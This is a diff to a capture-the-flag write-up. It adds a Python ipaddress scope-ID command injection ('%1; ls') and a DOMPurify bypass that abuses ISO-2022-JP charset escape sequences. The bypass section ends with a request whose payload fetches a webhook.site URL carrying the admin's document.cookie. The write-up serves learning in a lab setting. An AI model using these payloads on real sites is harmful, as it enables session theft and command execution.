@@ -492,7 +492,7 @@ def default():
     return render_template('index.html', protectionName=setName), protectionHeader
 ```
 
-Let's try to understand it bit by bit. By default, if we send it any values for example just an `empty string`. These response headers will be included in the output for sure.
+Let's try to understand it bit by bit. By default, if we send just an `empty string`. These response headers will be included in the output for sure.
 
 ```bash
  headers = {
@@ -516,7 +516,7 @@ Referrer-Policy: no-referrer
 
 Now if we input any values for `setName`, for example the value `test`, there are 2 more headers pops up in the response headers!
 
-However, only of them meet the conditions, the second response header that is included is not even inside the list of condition :T
+However, only 1 of them meet the conditions, the second response header that is included is not even inside the list of condition :T
 
 1. X-XSS-Protection: 1 ✅
 2. Protection-test: 1 ❌
@@ -616,6 +616,8 @@ Just for your information the payload that we are using right now will only work
 
 ## Ping as a Service
 
+### Analysis
+
 This website is really simple, nothing crazy going on...
 
 ```python
@@ -676,13 +678,170 @@ myIPaddress = ipaddress.ip_address(user_supplied_IP)
 
 ![](./Website/image4.png)
 
-I myself not a fan of reading docs, but decided to read it again and luckily this time found something suspicious.
+I myself not a fan of reading [docs](https://docs.python.org/3/library/ipaddress.html), but decided to read it again and luckily this time found something suspicious.
 
 > Optionally, the string may also have a scope zone ID, expressed with a suffix %scope_id. If present, the scope ID must be non-empty, and may not contain %. See RFC 4007 for details. For example, fe80::1234%1 might identify address fe80::1234 on the first link of the node.
 
 Therefore, I try to use IPv6 address together with a scope zone ID something like this request `2001:db8::1%1; ls` (without knowing the functionality of it ofc) and somehow it accepts the input together with the command injection payload :))
 
 ![](./Website/image5.png)
+
+## Impossible XSS
+
+### Analysis
+
+Looking at the tree structure of the website, I noticed that there is `bot.js`, and inside it there is a `puppeteer` library included, therefore there is a high chance that this challenge is related to `XSS`.
+
+`Puppeteer` is a headless browser automation tool that can simulate real browser interactions. In CTF challenges, it is commonly used to simulate an `admin bot`.
+
+```bash
+.
+├── docker-compose.yml
+├── Dockerfile
+└── app
+   ├── app.js
+   ├── bot.js
+   └── package.json
+
+3 directories, 10 files
+```
+
+This website has 2 endpoints that we can visit
+
+1. `/`
+2. `/report`
+
+At `/` endpoint which is most likely where the `XSS` vulnerability occur because there are no other place where we can `reflect` our input.
+
+```js
+fastify.get('/', (request, reply) => {
+  const userInput = request.query.input || 'Enter your input in /?input=here'
+
+  const window = new JSDOM('').window
+  const DOMPurify = createDOMPurify(window)
+  const clean = DOMPurify.sanitize(userInput)
+  console.log(clean)
+
+  reply.status(200).header('Content-Type', 'text/html').send(clean)
+})
+```
+
+I actually got stuck here for a couple of days because I can't find any payload that can somehow pop an `alert` here because of the `DOMPurify sanitization` function.
+
+Then I start to google information that is related to `DOMPurify bypass` and turns out that the only way for me to pop an alert is by finding `0 day` for that specific library 💀.
+
+#### DOMPurify Misconfig
+
+I find that really impossible so I start digging for more information and come across [this article by Seokchan Yoon](https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities/).
+
+Turns out there is actually a possibility to bypass `DOMPurify` _ONLY IF_ the developer misused/misconfigured the function.
+
+But again if you take a look at the source code, it is way too simple that you couldn't even find out what is misconfigured :T
+
+```js
+const window = new JSDOM('').window
+const DOMPurify = createDOMPurify(window)
+const clean = DOMPurify.sanitize(userInput)
+console.log(clean)
+
+reply.status(200).header('Content-Type', 'text/html').send(clean)
+```
+
+So I started asking for hint:-
+
+1. Is it related to mXSS?
+
+![](./Website/image7.png)
+
+2. Which then lead to another hint :)
+
+![](./Website/image8.png)
+
+#### Content Type Header Exploit
+
+If you take a look at this code snippet right here, the `Content-Type` is actually missing something, which is `charset` initialization.
+
+```js
+reply.status(200).header('Content-Type', 'text/html').send(clean)
+```
+
+```bash
+GET /?input=test HTTP/1.1
+
+HTTP/1.1 200 OK
+content-type: text/html
+```
+
+Usually it is set to `UTF-8`, but lucky for us here the developer forgot to set it, therefore we can use any type of `encoding` we want to break the `HTML` context.
+
+We can try to replicate this brilliant example here by [Stefan Schiller](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/#technique-2-breaking-html-context).
+
+```bash
+GET /?input=<img alt="test1"><img alt="test2">
+```
+
+![](./Website/image9.png)
+
+So technically our payload here isn't breaking any rules of `DOMPurify` so it will not sanitize anything.
+
+To change the charset from `ASCII / ISO-2022-JP` (on default) to something else like `JIS X 0208 1978` we need to use the `escape sequence` which is url encoded like-so `%1B`, following with a specific value `$@` to make the browser 'sniff' and decode all bytes with `JIS X 0208 1978`. So combine both of them it will be like this `%1B$@`.
+
+Now what we can do here is insert the `escape sequence` inside the `alt` attribute value just to see if it managed to break the `HTML context`.
+
+```bash
+GET /?input=<img alt="%1B$@">
+```
+
+As you can see here it definitely did, even the `DOMPurify` can't sanitize this payload, by right it should've enclosed the `img` tag like so `<img alt="%1B$@">`. However, the escape sequence value ends up consuming both the `closing double quote` and the `closing angle bracket`.
+
+![](./Website/image11.png)
+
+We are getting close, so now we need to change the charset from `JIS X 0208 1978` back to `ASCII / ISO-2022-JP` using this `escape sequence`, `%1B` followed with this value `(B`, to enable us to inject the rest of the `ASCII` payload in this case we will be using `onerror` attribute to pop an `alert`.
+
+```bash
+GET /?input=<img alt="%1B$@">%1B(B<img alt=" src=x onerror=alert('yo')//">
+```
+
+Let me explain the second part of the payload `%1B(B<img alt=" src=x onerror=alert('yo')//">`
+
+1. `%1B(B` - to 'sniff' the browser back to `ASCII / ISO-2022-JP`
+2. `alt="` - why alt with one tag? because to `enclose` the `consumed double quotes` from the previous `escape sequence` trick
+3. `src=x` - intentionally fires the `onerror` attribute after since x is `invalid` url/image
+4. `onerror=alert('yo')` - pop an alert box :)
+5. `//` - is used to comment out the rest of the payload because, the first image tag is not closed
+6. `"` - is used to close the second image `alt` attribute values
+7. `>` - to close the rest of second `img` tag
+
+Finally, it works!
+
+![](./Website/image12.png)
+
+#### Solve Script
+
+Now steal the cookie from admin by reporting the payload to `/report` endpoint by using `webhook`.
+
+```bash
+POST /report HTTP/1.1
+Host: localhost:7888
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 236
+Cookie: PHPSESSID=7rp218t2ljq7ni76inbto66cv1
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+url=%3Cimg+alt%3D%22%251B%24%40%22%3E%251B%28B+%3Cimg+alt%3D%22src%3Dx+onerror%3D%27fetch%28%60https%3A%2F%2Fwebhook.site%2F030e0794-2b99-41c3-96e6-b920e2f5634c%3Fc%3D%24%7BencodeURIComponent%28document.cookie%29%7D%60%29%27%2F%2F%22%3E
+```
+
+#### References
+
+1. https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities
+2. https://x.com/kevin_mizu/status/1733086824518787473
+3. https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/#technique-2-breaking-html-context
+4. https://x.com/terjanq/status/1876654801397911931
 
 # Mobile
 
